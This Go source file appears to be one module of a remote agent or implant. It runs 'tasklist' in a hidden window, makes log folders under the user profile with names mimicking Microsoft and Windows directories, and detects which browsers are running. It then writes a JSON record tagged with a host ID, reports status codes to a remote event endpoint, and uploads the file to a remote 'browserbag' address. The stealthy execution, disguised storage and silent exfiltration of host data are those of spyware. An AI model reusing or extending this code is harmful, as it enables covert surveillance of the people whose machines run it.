package lib

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

var BrowSer = []string{
	"iexplore.exe",      //IE浏览器
	"sogouexplorer.exe", //搜狗浏览器
	"The world .exe",    // 世界之窗浏览器
	"Firefox.exe",       // 火狐浏览器
	"opera.exe",         //opera浏览器
	"360SE.exe",         //360浏览器
	"chrome.exe",        //google浏览器
	"Maxthon.exe",       //遨游浏览器
}

//create a dir
func Create_dir(path string) {
	err := os.MkdirAll(path, 0711)
	if err != nil {
		log.Fatal(err)
	}
}

var path = []string{
	get_current_user() + "\\temp\\log\\",
	get_current_user() + "\\microsoftNet\\log\\",
	get_current_user() + "\\WindowsLog\\log\\",
}

func tasklist() {
	for _, d := range path {
		Create_dir(d)
	}
	cmd := exec.Command("cmd", "/C", "tasklist >", DATAPATH+"tasklist.txt")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	// block until create taskklis.txt
	cmd.Run()
}

type Favb struct {
	Using  string `json:"use"`
	Hostid string `json:"hostid"`
}

func Fav(addr string) {
	tasklist()
	arr := make([]string, 0)
	read, _ := ioutil.ReadFile(DATAPATH + "tasklist.txt")
	for _, b := range BrowSer {
		if strings.Contains(string(read), b) {
			fav := Favb{
				Using:  b,
				Hostid: HOSTID,
			}
			if f, err := json.Marshal(fav); err == nil {
				arr = append(arr, string(f))
			}
		}
	}
	//not null post
	if len(arr) > 0 {
		filename := DATAPATH + HOSTID + "-favb.txt"
		f, ferr := os.Create(filename)
		if ferr != nil {
			log.Println(ferr)
			EventStatusCode(104, HOSTID, VERSION, "1", addr+"Event")
		}
		defer f.Close()
		w := bufio.NewWriter(f)
		for _, line := range arr {
			fmt.Fprintln(w, line)
		}
		w.Flush()
		EventStatusCode(103, HOSTID, VERSION, "1", addr+"Event")
		finflag := make(chan string)
		go SingleFile(filename, addr+"browserbag", finflag)
	}
}
